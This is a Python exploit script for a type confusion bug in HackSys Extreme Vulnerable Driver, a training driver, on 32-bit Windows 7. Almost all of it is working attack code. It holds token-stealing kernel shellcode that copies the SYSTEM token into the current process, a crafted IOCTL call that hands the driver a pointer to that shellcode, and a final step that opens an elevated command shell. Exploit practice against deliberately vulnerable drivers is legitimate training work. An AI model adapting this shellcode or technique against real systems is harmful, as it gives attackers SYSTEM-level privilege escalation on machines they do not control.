# Windows Kernel Exploitation 
# HEVD x86 Type Confusion
# Platform: Windows 7 x86
# Arjun Basnet

import os
import sys
import struct
from ctypes import *
from ctypes.wintypes import *

kernel32  = windll.kernel32


def TokenStealingShellcodeWin7():
	shellcode = (
		#/* --- Setup --- */
        "\x60"                        # pushad
        "\x64\xA1\x24\x01\x00\x00"    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                    # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"    # mov ebx, [eax + TOKEN_OFFSET]
        #/* --- Copy System token */
        "\xBA\x04\x00\x00\x00"        # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"    # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"        # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"    # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                    # jnz
        "\x8B\x90\xF8\x00\x00\x00"    # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"    # mov [ecx + TOKEN_OFFSET], edx
        #/* --- Cleanup --- */
        "\x61"                        # popad
        "\xC3"
	)
		
	ShellcodePtr = id(shellcode) + 20
	print "[+] Shellcode Pointer Address: 0x%X" % ShellcodePtr
	return ShellcodePtr
		
		
def main():
	lpBytesReturned = c_ulong()
	
	#(GENERIC_READ | GENERIC_WRITE) = 0XC0000000
	hDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
	
	if not hDevice or hDevice == -1:
		print "[!] Error to get handle to the driver " + str(ctypes.GetLastError())
		return -1
	
	print "[+] Input that passed to Kernel Drivers"
	
	#Contrusting USER Type Confusion
	shell = struct.pack("L", TokenStealingShellcodeWin7())
	buf = "\x41" * 4 + shell
	
	bufSize  = len(buf)
	bufPtr = id(buf) + 20
	print "[+] Buffer Pointer Address: 0x%X " % bufPtr
	kernel32.DeviceIoControl(hDevice, 0x222023, bufPtr, bufSize, None, 0,byref(lpBytesReturned), None)

	print "[+] Privilege Windows Command Shell"
	os.system('cmd.exe')
         
if __name__ == '__main__':
	main()
